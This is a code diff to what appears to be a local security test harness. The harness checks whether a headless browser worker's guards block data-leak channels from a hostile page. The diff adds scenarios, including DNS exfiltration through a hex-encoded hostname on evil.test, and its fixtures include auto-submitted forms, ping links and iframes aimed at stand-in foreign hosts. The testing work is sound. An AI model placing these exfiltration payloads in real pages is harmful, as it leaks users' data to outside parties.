@@ -1,6 +1,9 @@
 // CHANNEL MATRIX: for every network channel a hostile page could use, does the worker's full guard stack (scope policy + effect gate + session CSP,
-// i.e. the REAL createApp) stop it? Run against Chromium launched two ways, because a cloud provider starts Chrome itself and connects over CDP
-// (`stock`), while the repo's automated suites use Playwright's launcher (`playwright`) and cannot see everything `stock` can.
+// i.e. the REAL createApp) stop it? Run against two BROWSER BINARIES (the 3rd mode adds an allow-list proxy in front of the second):
+//   mode `playwright` = Playwright's default `chromium.launch()`, which runs chrome-headless-shell (what the repo's automated suites use);
+//   mode `stock`      = full Chrome started directly with --remote-debugging-port, then connectOverCDP (how a provider runs it).
+// The DIFFERENCE IS THE BINARY (an independent audit showed Playwright's full-Chrome channel behaves like `stock`), not the way CDP is attached:
+// headless-shell has no DNS/TLS/prerender hints at all, so the repo suite cannot see that whole class.
 // Everything is local: made-up hostnames are mapped to one fixture server on 127.0.0.1 (nothing leaves the machine; no third-party host is contacted).
 //   cd services/browser && node scripts/channel-matrix.mjs            (CHROME=/path/to/chrome to override; OUT=dir for the report files)
 import fs from "node:fs";
@@ -52,6 +55,9 @@ const scenarios = [
   { id: "script-nav-inscope", title: "script timer navigates inside the scope with a query", js: (s) => `setTimeout(()=>{location.href="${s.lab}?moved=1"},800);` },
   { id: "form-autosubmit", title: "script submits a POST form to a foreign host", html: (s) => `<form id="f" method="post" action="${s.evil("/fp")}"><input name="a" value="secret"></form>`, js: () => `setTimeout(()=>document.getElementById("f").submit(),800);` },
   { id: "link-ping", title: "<a ping> on the allowed link", click: true, html: (s) => `<a id="pinger" ping="${s.evil("/ping")}" href="/browser-lab/page2.html">Next page</a>`, noDefaultLink: true },
+  { id: "dns-exfil-nav", title: "script navigates to a hostname that CARRIES data (hex label): DNS/TLS even when the navigation is blocked", js: () => `setTimeout(()=>{location.href="https://74797065642d736563726574.evil.test/"},800);`, observe: "tls" },
+  { id: "doc-hop-query", title: "link whose server answers 302 to an in-scope URL WITH a query (document hop)", clickHref: (s) => `/browser-lab/go-${s.id}`, redirect: (s) => `${s.lab}?id=1&action=delete` },
+  { id: "a-download-script", title: "script-created same-origin <a download> with a query, clicked", js: (s) => `${D}D(()=>{const a=document.createElement("a");a.href="${s.lab}?x=1";a.download="x.txt";document.body.appendChild(a);setTimeout(()=>a.click(),700)});` },
   { id: "redirect-offscope", title: "link whose server answers 302 to a foreign host", clickHref: (s) => `/browser-lab/go-${s.id}`, redirect: (s) => s.evil("/red") },
   { id: "download", title: "link to an attachment / octet-stream response", clickHref: (s) => `/browser-lab/file-${s.id}`, download: true },
   { id: "iframe-object", title: "<iframe>/<object>/<embed> to a foreign host", html: (s) => `<iframe src="${s.evil("/if")}"></iframe><object data="${s.evil("/ob")}"></object><embed src="${s.evil("/em")}">` },
@@ -179,7 +185,7 @@ site.closeAllConnections(); site.close(); fs.rmSync(dir, { recursive: true, forc
 fs.mkdirSync(OUT, { recursive: true });
 fs.writeFileSync(path.join(OUT, "channel-matrix.json"), JSON.stringify({ at: new Date().toISOString(), chrome: CHROME, browserHousekeepingHostsRefusedByProxy: [...browserHousekeeping], rows }, null, 2));
 const cell = (id, mode) => { const r = rows.find((x) => x.id === id && x.mode === mode); return !r ? "?" : r.leaked ? "**LEAK**" : r.observable === "none-locally" ? "not observable locally" : "stopped"; };
-const md = ["| channel | Playwright-launched | stock Chrome (provider-style) | stock Chrome + allow-list proxy | evidence (stock, no proxy) | refused at the proxy |", "|---|---|---|---|---|---|",
+const md = ["| channel | headless-shell (Playwright's default binary) | full Chrome, launched directly (provider-style) | full Chrome + allow-list proxy | evidence (full Chrome, no proxy) | refused at the proxy |", "|---|---|---|---|---|---|",
   ...scenarios.map((s) => `| ${s.title} | ${cell(s.id, "playwright")} | ${cell(s.id, "stock")} | ${cell(s.id, "stock+proxy")} | ${(rows.find((x) => x.id === s.id && x.mode === "stock")?.evidence ?? []).slice(0, 2).join("<br>") || "-"} | ${(rows.find((x) => x.id === s.id && x.mode === "stock+proxy")?.deniedAtProxy ?? []).slice(0, 3).join("<br>") || "-"} |`)].join("\n");
 fs.writeFileSync(path.join(OUT, "channel-matrix.md"), `# Channel matrix (real worker guard stack, local fixture, ${new Date().toISOString()})\n\nLEAK = something reached the fixture "internet" (HTTP request, WebSocket upgrade, or a TLS handshake whose SNI is a foreign host). "stopped" = nothing reached it. "refused at the proxy" = the allow-list proxy denied the destination BEFORE any DNS lookup/TLS handshake. Chrome's own housekeeping hosts (${[...browserHousekeeping].join(", ") || "none seen"}) are excluded from the page-channel columns.\n\n${md}\n`);
 console.log("\n" + md);
